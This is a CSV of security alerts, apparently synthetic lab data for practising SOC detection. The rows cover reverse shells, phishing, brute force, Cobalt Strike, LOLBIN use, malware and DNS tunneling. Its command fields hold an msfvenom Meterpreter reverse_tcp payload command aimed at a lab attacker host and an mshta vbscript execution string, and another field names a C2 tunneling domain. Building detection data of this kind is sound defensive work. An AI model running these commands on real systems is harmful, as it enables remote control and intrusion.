access_type,action,action_taken,agent_ip,agent_name,attachment,attacker_host,attempt_count,bytes_sent,bytes_transferred,cloud_provider,command,command_line,destination_domain,destination_host,destination_ip,destination_port,dns_query,encryption_type,event_code,event_type,failure_reason,file_hash,file_path,files_affected,host,image,indicator,injection_type,lab_attack,lab_note,log_source,login_location_1,login_location_2,logon_type,malware_name,mitre_technique,parent_process,ports_scanned,privileges_assigned,process,process_id,protocol,query_count,query_type,recipient,registry_key,resource,rule_name,scan_type,sender,service_name,severity,signature,signature_id,signed,source_host,source_ip,source_process,subject,target_ip,target_process,time_difference_minutes,timestamp,tool,user,value,wazuh_rule_desc,wazuh_rule_id
,,,,,,,,,,,,msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.56.104 LPORT=4444,,,192.168.56.104,4445,,,1,Reverse Shell Detected,,,,,WIN-PRAHARSH-01,,,,True,,Sysmon,,,,,T1059.001,,,,,,,,,,,,,,,,Critical,,,,,192.168.56.105,,,,,,2026-04-23T03:59:37.664386,Metasploit / Netcat,john.doe,,,
,,,,,invoice.xlsm,,,,,,,,,,,,,,,Phishing Email,,,,,,,,,,,Email Gateway,,,,,T1566.001,,,,,,,,,jane.smith@praharsh-lab.local,,,,,hr-support@secure-login[.]com,,High,,,,,,,Invoice #12345 Attached,,,,2026-04-21T06:39:37.669023,,,,,
,,,,,,KALI-LAB-01,477,,,,,,,,192.168.56.105,,,,4625,Brute Force Attempt,,,,,WIN-PRAHARSH-01,,,,True,,Windows Security,,,,,T1110.001,,,,,,,,,,,,,,,,High,,,,,192.168.56.104,,,,,,2026-04-19T21:41:37.661598,Hydra,lab.administrator,,,
,,,,,,,,,,,,,,,91.234.56.78,,,,,IDS Alert,,,,,,,,,,,Suricata / Snort,,,,,,,,,,,,,,,,,,,,,Critical,ET MALWARE CobaltStrike Beacon,2183594,,,192.168.56.103,,,,,,2026-04-24T01:47:37.668701,,,,,
,,,,,,KALI-LAB-01,192,,,,,,,,192.168.56.105,,,,4625,Brute Force Attempt,,,,,WIN-PRAHARSH-01,,,,True,,Windows Security,,,,,T1110.001,,,,,,,,,,,,,,,,High,,,,,192.168.56.104,,,,,,2026-04-21T09:26:37.661533,Hydra,lab.administrator,,,
,,,,,,,,,,,,"mshta vbscript:Execute(""CreateObject(""Wscript.Shell"").Run"")",,,,,,,1,LOLBIN Execution,,,,,WIN-PRAHARSH-01,,,,True,,Sysmon,,,,,T1218,,,,bitsadmin.exe,,,,,,,,,,,,High,,,,,,,,,,,2026-04-23T08:33:37.664953,,svc.splunk,,,
,,,,,,,238,,,,,,,,,3389,,,4625,RDP Brute Force,,,,,WIN-PRAHARSH-01,,,,True,,Windows Security,,,,,T1110.003,,,,,,,,,,,,,,,,High,,,,,192.168.56.104,,,,,,2026-04-23T03:41:37.662259,Hydra / CrackMapExec,dev.engineer,,,
,,Blocked,,,,,,,,,,,,,,,,,,Malware Detected,,5f4dcc3b5aa765d61d8327deb882cf99,C:\Users\Public\malware.exe,,DEV-SERVER-01,,,,,,Windows Defender / Wazuh,,,,Trojan.GenericKD,,,,,,,,,,,,,,,,,High,,,,,,,,,,,2026-04-19T23:20:37.667221,,,,,
,,,,,,,,,,,,,,,,,,,4624,Successful Login,,,,,DEV-SERVER-01,,,,,,Windows Security,,,2,,,,,,,,,,,,,,,,,,Info,,,,,10.0.2.15,,,,,,2026-04-23T15:47:37.661237,,john.doe,,,
,,,,,,,,,,,,,,,,,aGVsbG8.evil-c2[.]com,,,DNS Tunneling Detected,,,,,WIN-PRAHARSH-01,,,,,,DNS / Zeek,,,,,T1071.004,,,,,,,194,TXT,,,,,,,,Critical,,,,,,,,,,,2026-04-23T03:17:37.666649,,,,,
